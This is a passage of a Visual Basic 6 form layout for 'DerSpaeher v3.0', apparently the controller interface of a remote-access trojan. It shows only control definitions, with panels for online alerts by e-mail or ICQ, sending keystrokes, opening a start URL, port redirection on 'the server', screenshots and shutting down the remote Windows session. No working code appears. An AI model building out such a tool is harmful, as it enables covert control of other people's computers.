            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   1320
         TabIndex        =   323
         Top             =   0
         Width           =   4365
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   300
         Index           =   27
         Left            =   120
         Shape           =   2  'Oval
         Top             =   1680
         Width           =   2295
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   300
         Index           =   26
         Left            =   4440
         Shape           =   2  'Oval
         Top             =   1680
         Width           =   2295
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3435
         Index           =   33
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   0
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   37
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.OptionButton Option6 
         BackColor       =   &H00808000&
         Caption         =   "icq"
         Height          =   210
         Left            =   5640
         TabIndex        =   210
         Top             =   2520
         Width           =   1095
      End
      Begin VB.OptionButton Option5 
         BackColor       =   &H00808000&
         Caption         =   "e-mail"
         Height          =   210
         Left            =   5640
         TabIndex        =   209
         Top             =   2160
         Width           =   1095
      End
      Begin VB.TextBox txttextfelder 
         Alignment       =   1  'Right Justify
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   360
         Index           =   3
         Left            =   1440
         TabIndex        =   46
         Top             =   2910
         Width           =   3975
      End
      Begin VB.TextBox txttextfelder 
         Alignment       =   1  'Right Justify
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   345
         Index           =   2
         Left            =   1440
         TabIndex        =   44
         Top             =   2520
         Width           =   3975
      End
      Begin VB.TextBox txttextfelder 
         Alignment       =   1  'Right Justify
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   315
         Index           =   1
         Left            =   1440
         TabIndex        =   42
         Top             =   2160
         Width           =   3975
      End
      Begin VB.TextBox txttextfelder 
         Alignment       =   1  'Right Justify
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   285
         Index           =   0
         Left            =   120
         TabIndex        =   40
         Top             =   1170
         Width           =   5295
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "current settings"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   390
         Index           =   3
         Left            =   240
         TabIndex        =   54
         Top             =   3480
         Width           =   3495
      End
      Begin VB.Image Image1 
         Height          =   240
         Left            =   5520
         Picture         =   "ds3English!.frx":1FAE
         Top             =   1200
         Width           =   240
      End
      Begin VB.Label lblStandart 
         Alignment       =   1  'Right Justify
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "subject:"
         ForeColor       =   &H00C0C000&
         Height          =   210
         Index           =   2
         Left            =   570
         TabIndex        =   47
         Top             =   3000
         Width           =   840
      End
      Begin VB.Label lblStandart 
         Alignment       =   1  'Right Justify
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "mail-adress:"
         ForeColor       =   &H00C0C000&
         Height          =   210
         Index           =   1
         Left            =   150
         TabIndex        =   45
         Top             =   2640
         Width           =   1260
      End
      Begin VB.Label lblStandart 
         Alignment       =   1  'Right Justify
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "mail-server:"
         ForeColor       =   &H00C0C000&
         Height          =   210
         Index           =   0
         Left            =   135
         TabIndex        =   43
         Top             =   2280
         Width           =   1260
      End
      Begin VB.Label lblEMailAbfrage 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "fill out the required textboxes"
         ForeColor       =   &H00404000&
         Height          =   210
         Left            =   120
         TabIndex        =   41
         Top             =   1800
         Width           =   3255
      End
      Begin VB.Label lblPfadAbfrage 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Type Path"
         ForeColor       =   &H00404000&
         Height          =   210
         Left            =   120
         TabIndex        =   39
         Top             =   840
         Width           =   945
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "Yeah"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   390
         Index           =   0
         Left            =   5400
         TabIndex        =   38
         Top             =   3480
         Width           =   1335
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   435
         Index           =   0
         Left            =   5280
         Shape           =   2  'Oval
         Top             =   3465
         Width           =   1575
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   435
         Index           =   3
         Left            =   120
         Shape           =   2  'Oval
         Top             =   3465
         Width           =   3735
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   855
         Index           =   1
         Left            =   0
         Top             =   720
         Width           =   6915
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   2340
         Index           =   0
         Left            =   0
         Top             =   1680
         Width           =   6915
      End
      Begin VB.Label lblServerUeberschrift 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "ONLINE ALERT"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Index           =   1
         Left            =   1950
         TabIndex        =   48
         Top             =   0
         Width           =   3075
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   23
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   189
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.TextBox txttextfelder 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   375
         Index           =   25
         Left            =   120
         TabIndex        =   190
         Top             =   1080
         Width           =   6615
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "Yeah"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   480
         Index           =   28
         Left            =   2415
         TabIndex        =   193
         Top             =   2055
         Width           =   1995
      End
      Begin VB.Label Label21 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "START URL"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   2310
         TabIndex        =   192
         Top             =   0
         Width           =   2325
      End
      Begin VB.Label lblHinweiszuServerEinstellungen 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "url:"
         ForeColor       =   &H00404000&
         Height          =   210
         Index           =   27
         Left            =   120
         TabIndex        =   191
         Top             =   720
         Width           =   420
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   525
         Index           =   28
         Left            =   2280
         Shape           =   2  'Oval
         Top             =   2040
         Width           =   2295
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3555
         Index           =   20
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   19
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   183
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.ListBox List6 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         Columns         =   5
         ForeColor       =   &H00FFFFFF&
         Height          =   1920
         ItemData        =   "ds3English!.frx":20F8
         Left            =   120
         List            =   "ds3English!.frx":215F
         TabIndex        =   357
         Top             =   1560
         Width           =   6615
      End
      Begin VB.TextBox txttextfelder 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   375
         Index           =   24
         Left            =   120
         TabIndex        =   184
         Top             =   1080
         Width           =   6615
      End
      Begin VB.Label lblHinweiszuServerEinstellungen 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "type the keys you wanna send:"
         ForeColor       =   &H00404000&
         Height          =   210
         Index           =   23
         Left            =   120
         TabIndex        =   187
         Top             =   720
         Width           =   3045
      End
      Begin VB.Label Label17 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "SEND KEYS"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   2280
         TabIndex        =   186
         Top             =   0
         Width           =   2325
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "Yeah"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   480
         Index           =   20
         Left            =   255
         TabIndex        =   185
         Top             =   3615
         Width           =   1995
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   525
         Index           =   20
         Left            =   120
         Shape           =   2  'Oval
         Top             =   3600
         Width           =   2295
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3555
         Index           =   19
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   33
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   333
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.TextBox txttextfelder 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         Height          =   315
         Index           =   29
         Left            =   240
         MaxLength       =   5
         TabIndex        =   338
         Top             =   1200
         Width           =   1215
      End
      Begin VB.TextBox txttextfelder 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H00000000&
         Height          =   1515
         Index           =   30
         Left            =   240
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   336
         Top             =   1920
         Width           =   6495
      End
      Begin VB.Label Label36 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "output:"
         ForeColor       =   &H00404000&
         Height          =   210
         Index           =   1
         Left            =   240
         TabIndex        =   340
         Top             =   1680
         Width           =   735
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "stop"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   315
         Index           =   33
         Left            =   3000
         TabIndex        =   339
         Top             =   3600
         Width           =   2025
      End
      Begin VB.Label Label36 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "This port will be open at the server"
         ForeColor       =   &H00404000&
         Height          =   210
         Index           =   0
         Left            =   240
         TabIndex        =   337
         Top             =   840
         Width           =   3780
      End
      Begin VB.Label Label35 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "PORT REDIRECT"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   1800
         TabIndex        =   335
         Top             =   0
         Width           =   3345
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "activate"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   315
         Index           =   32
         Left            =   360
         TabIndex        =   334
         Top             =   3600
         Width           =   2025
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   360
         Index           =   32
         Left            =   240
         Shape           =   2  'Oval
         Top             =   3585
         Width           =   2295
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   360
         Index           =   33
         Left            =   2880
         Shape           =   2  'Oval
         Top             =   3585
         Width           =   2295
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3315
         Index           =   34
         Left            =   0
         Top             =   720
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   6
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   95
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.Label lblScreenshoot 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "no screenshot"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   270
         Left            =   2445
         TabIndex        =   98
         Top             =   3000
         Width           =   1950
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "screenshot"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   480
         Index           =   9
         Left            =   1860
         TabIndex        =   97
         Top             =   1335
         Width           =   3075
      End
      Begin VB.Label Label4 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "SCREENSHOT"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   2190
         TabIndex        =   96
         Top             =   0
         Width           =   2565
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   525
         Index           =   9
         Left            =   1680
         Shape           =   2  'Oval
         Top             =   1320
         Width           =   3435
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3315
         Index           =   22
         Left            =   0
         Top             =   720
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   7
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   99
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.Label lblwindows 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "window manager"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   11
         Left            =   3120
         TabIndex        =   249
         Top             =   3720
         Width           =   1680
      End
      Begin VB.Label lblwindows 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "screenshot"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   10
         Left            =   3120
         TabIndex        =   248
         Top             =   3360
         Width           =   1200
      End
      Begin VB.Label lblStandart 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "others..."
         ForeColor       =   &H00404000&
         Height          =   210
         Index           =   25
         Left            =   3120
         TabIndex        =   247
         Top             =   3000
         Width           =   945
      End
      Begin VB.Label lblwindows 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   """start"""
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   0
         Left            =   3120
         TabIndex        =   112
         Top             =   2640
         Width           =   840
      End
      Begin VB.Label lblwindows 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   """find"""
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   9
         Left            =   3120
         TabIndex        =   111
         Top             =   2280
         Width           =   720
      End
      Begin VB.Label lblwindows 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   """taskbar setting"""
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   8
         Left            =   3120
         TabIndex        =   110
         Top             =   1920
         Width           =   2040
      End
      Begin VB.Label lblwindows 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   """clock settings"""
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   7
         Left            =   3120
         TabIndex        =   109
         Top             =   1560
         Width           =   1920
      End
      Begin VB.Label lblwindows 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   """shut down windows"""
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   6
         Left            =   3120
         TabIndex        =   108
         Top             =   1200
         Width           =   2280
      End
      Begin VB.Label lblStandart 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "Fun..."
         ForeColor       =   &H00404000&
         Height          =   210
         Index           =   22
         Left            =   240
         TabIndex        =   107
         Top             =   1560
         Width           =   630
      End
      Begin VB.Label lblStandart 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "show windows"
         ForeColor       =   &H00404000&
         Height          =   210
         Index           =   21
         Left            =   3120
         TabIndex        =   106
         Top             =   840
         Width           =   1260
      End
      Begin VB.Label lblwindows 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "close all"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   5
         Left            =   720
         TabIndex        =   105
         Top             =   3480
         Width           =   1080
      End
      Begin VB.Label lblwindows 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "scale down all"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   4
         Left            =   720
         TabIndex        =   104
         Top             =   3000
         Width           =   1680
      End
      Begin VB.Label lblwindows 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "maximize all"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   3
         Left            =   720
         TabIndex        =   103
         Top             =   2520
         Width           =   1440
      End
      Begin VB.Label lblwindows 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "minimize all"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   2
         Left            =   720
         TabIndex        =   102
         Top             =   2040
         Width           =   1440
      End
      Begin VB.Image Image7 
         Height          =   480
         Left            =   120
         Picture         =   "ds3English!.frx":2232
         Top             =   2880
         Width           =   480
      End
      Begin VB.Image Image6 
         Height          =   480
         Left            =   120
         Picture         =   "ds3English!.frx":253C
         Top             =   3360
         Width           =   480
      End
      Begin VB.Image Image4 
         Height          =   480
         Left            =   120
         Picture         =   "ds3English!.frx":2846
         Top             =   2400
         Width           =   480
      End
      Begin VB.Image Image5 
         Height          =   480
         Left            =   120
         Picture         =   "ds3English!.frx":2B50
         Top             =   1920
         Width           =   480
      End
      Begin VB.Image Image3 
         Height          =   480
         Left            =   120
         Picture         =   "ds3English!.frx":2E5A
         Top             =   960
         Width           =   480
      End
      Begin VB.Label lbloben 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "WINDOWS"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Index           =   0
         Left            =   2565
         TabIndex        =   101
         Top             =   120
         Width           =   1815
      End
      Begin VB.Label lblwindows 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "Current User"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   1
         Left            =   720
         TabIndex        =   100
         Top             =   1080
         Width           =   1920
         WordWrap        =   -1  'True
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3435
         Index           =   8
         Left            =   0
         Top             =   720
         Width           =   6915
      End
   End
   Begin VB.PictureBox Picture3 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   5535
      Left            =   0
      ScaleHeight     =   5535
      ScaleWidth      =   10005
      TabIndex        =   301
      Top             =   0
      Visible         =   0   'False
      Width           =   10000
      Begin VB.TextBox Text11 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H00FFFFFF&
         Height          =   315
         Left            =   2400
         TabIndex        =   314
         Top             =   3120
         Width           =   5295
      End
      Begin VB.Label lblDialog 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "OK"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   270
         Index           =   2
         Left            =   4560
         TabIndex        =   305
         Top             =   2655
         Width           =   855
      End
      Begin VB.Label lblDialog 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "No"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   270
         Index           =   1
         Left            =   6000
         TabIndex        =   304
         Top             =   2655
         Width           =   855
      End
      Begin VB.Label lblDialog 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "Yes"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   270
         Index           =   0
         Left            =   3240
         TabIndex        =   303
         Top             =   2655
         Width           =   855
      End
      Begin VB.Label lblD 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "DerSpaeher v3.0 %-)"
         ForeColor       =   &H00FFFF00&
         Height          =   705
         Left            =   3120
         TabIndex        =   302
         Top             =   1800
         Width           =   3795
         WordWrap        =   -1  'True
      End
      Begin VB.Shape shpDialog 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   315
         Index           =   0
         Left            =   3120
         Shape           =   2  'Oval
         Top             =   2640
         Width           =   1095
      End
      Begin VB.Shape shpDialog 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
